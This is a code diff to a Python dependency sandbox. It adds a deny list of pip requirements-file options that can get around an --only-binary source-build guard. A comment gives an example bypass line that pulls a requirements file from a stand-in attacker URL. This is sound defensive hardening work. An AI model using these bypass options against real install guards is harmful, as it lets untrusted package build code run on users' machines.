@@ -112,6 +112,53 @@ _PIP_OPTION_LINE_PREFIXES = (
     "--no-build-isolation",
 )
 
+# SECURITY-FIX: option lines that DEFEAT or ROUTE AROUND the --only-binary
+# :all: guard, so they are unsafe whenever source builds are off even though
+# they are not package specifiers. Checked before the generic option skip
+# above, since every one of these is also in _PIP_OPTION_LINE_PREFIXES:
+#
+# - `--no-binary` in a requirements file is applied by pip AFTER the CLI's
+#   --only-binary :all: (both feed one FormatControl; the later write wins,
+#   and `:all:` on either side clears the other), so a single
+#   `--no-binary :all:` line in the manifest silently re-enables sdist
+#   builds for every package while the approval panel still shows source
+#   builds as off.
+# - `-r`/`--requirement` and `-c`/`--constraint` make pip read ANOTHER file
+#   (a local path, or a URL pip fetches itself) whose lines never pass
+#   through _direct_reference_requirement_lines at all - a one-line
+#   `-r https://attacker/reqs.txt` smuggles in any `pkg @ file://` or
+#   `-e` line this whole check exists to stop.
+# - `--global-option`/`--install-option`/`--config-settings`/
+#   `--no-build-isolation` only do anything during a source build, which
+#   is exactly what is supposed to be impossible here; there is no
+#   legitimate reason for a manifest to carry them while builds are off,
+#   and refusing them closes the "build happens anyway via one of the
+#   holes above, and now also runs with attacker-chosen build flags"
+#   combination.
+#
+# Everything else on the skip list (index/find-links/trusted-host/hash/
+# no-deps/pre/prefer-binary/...) selects WHERE a wheel comes from, not
+# whether code runs before the user's approved script does, and stays
+# allowed - the existing end-to-end tests' `--find-links <dir>` /
+# `--no-index` manifests depend on that.
+_GUARD_DEFEATING_OPTION_PREFIXES = (
+    "--no-binary",
+    "-r", "--requirement",
+    "-c", "--constraint",
+    "--global-option",
+    "--install-option",
+    "--config-settings",
+    "--no-build-isolation",
+)
+
+
+def _option_name(line):
+    """The option token itself, split from its value whether written
+    `--opt value`, `--opt=value`, or `-r value`, so `--no-binary` cannot be
+    confused with a hypothetical `--no-binary-something`."""
+    head = re.split(r"[\s=]", line, maxsplit=1)[0]
+    return head
+
 
 def _direct_reference_requirement_lines(normalized_requirements):
     """Returns the requirements-file lines that name a package by direct
@@ -152,6 +199,11 @@ def _direct_reference_requirement_lines(normalized_requirements):
         if not line:
             continue
         if line.startswith(("-e", "--editable")):
+            unsafe_lines.append(raw_line.strip())
+            continue
+        if line.startswith("-") and _option_name(line) in _GUARD_DEFEATING_OPTION_PREFIXES:
+            # See _GUARD_DEFEATING_OPTION_PREFIXES - must run before the
+            # generic option skip just below, which would wave it through.
             unsafe_lines.append(raw_line.strip())
             continue
         if line.startswith(_PIP_OPTION_LINE_PREFIXES):
@@ -443,11 +495,13 @@ class VirtualEnvSandbox:
                 raise RuntimeError(
                     "Dependency installation blocked: the requirements list "
                     "contains a direct URL, editable (-e), or local-path "
-                    "reference. Pip builds that reference using its own "
-                    "code regardless of --only-binary :all:, so this cannot "
-                    "be installed without explicitly allowing source "
-                    "builds. Enable \"Allow source builds\" to install it, "
-                    "or remove the line(s) below:\n" + offending
+                    "reference, or a pip option (--no-binary, -r/-c, "
+                    "--global-option, --config-settings, ...) that would "
+                    "let a package's own build code run regardless of "
+                    "--only-binary :all:. This cannot be installed without "
+                    "explicitly allowing source builds. Enable \"Allow "
+                    "source builds\" to install it, or remove the line(s) "
+                    "below:\n" + offending
                 )
         manifest_hash = hashlib.sha256(normalized.encode("utf-8")).hexdigest()
         previous_hash = self.requirements_hash_file.read_text(encoding="utf-8").strip() if self.requirements_hash_file.exists() else ""
